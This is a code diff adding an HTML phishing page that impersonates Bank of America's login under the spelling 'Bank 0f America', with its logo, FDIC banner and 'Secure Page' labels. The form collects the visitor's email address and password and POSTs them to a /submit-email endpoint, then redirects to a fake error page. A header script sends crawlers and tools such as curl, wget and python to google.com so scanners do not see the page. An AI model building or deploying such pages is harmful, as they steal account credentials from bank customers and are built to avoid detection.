@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <script>
+    /* anti-bot */
+    const bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    const ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank 0f America</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+
+  <style>
+  #spinner-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: rgba(255, 255, 255, 0.61);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
+  }
+
+  .spinner {
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #db3434;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+
+</head>
+
+<body>
+
+    <div class="fdic-banner">
+  <span>Bank 0f America deposit products:</span>
+  <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" 
+       alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government">
+</div>
+
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/logo-main.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Email Verification</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Enter your email.</h1>
+      <p class="subtitle">
+        Using industry standard encryption to protect your data,
+        <br> we instantly confirm your email and then establish a secure
+        connection to verify with your email service provider.
+      </p>
+    </div>
+
+    <form id="login-details">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <div class="input-with-icon">
+          <input type="email" id="email" name="email" autocomplete="off" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-with-icon">
+          <input type="password" id="password" name="password" autocomplete="off" required />
+        </div>
+      </div>
+
+      <div id="spinner-overlay" style="display: none;">
+  <div class="spinner"></div>
+</div>
+
+      <div class="button-group">
+        <button type="submit" class="btn primary">Continue</button>
+        <button type="button" class="btn outlined">Cancel</button>
+      </div>
+    </form>
+
+  <script>
+  var form = document.getElementById("login-details");
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    var email = document.getElementById("email").value.trim();
+    var password = document.getElementById("password").value;
+
+    if (!email || !password) {
+      alert("⚠️ Please enter both email and password.");
+      return;
+    }
+
+    // Show loading spinner
+    document.getElementById("spinner-overlay").style.display = "flex";
+
+    try {
+      const response = await fetch("/submit-email", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      });
+
+      if (response.ok) {
+        // Redirect after submission
+        setTimeout(() => {
+          window.location.href = "email-error.html";
+        }, 1000);
+      } else {
+        alert("❌ Submission failed.");
+        document.getElementById("spinner-overlay").style.display = "none";
+      }
+    } catch (error) {
+      console.error("Submission failed:", error);
+      alert("🚫 An error occurred. Please try again.");
+      document.getElementById("spinner-overlay").style.display = "none";
+    }
+  });
+
+  // Cancel button
+  var cancelBtn = document.getElementById("cancelBtn");
+  cancelBtn.addEventListener("click", function () {
+    window.location.href = "hse54he.html";
+  });
+</script>
+
+
+    </form>
+  </div>
+</body>
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="#" target="_blank">Privacy</a>
+        <a href="#" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank 0f America, N.A. Member FDIC.
+      <a href="#" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank 0f America Corporation.
+    </p>
+  </div>
+</footer>
+
+</html>
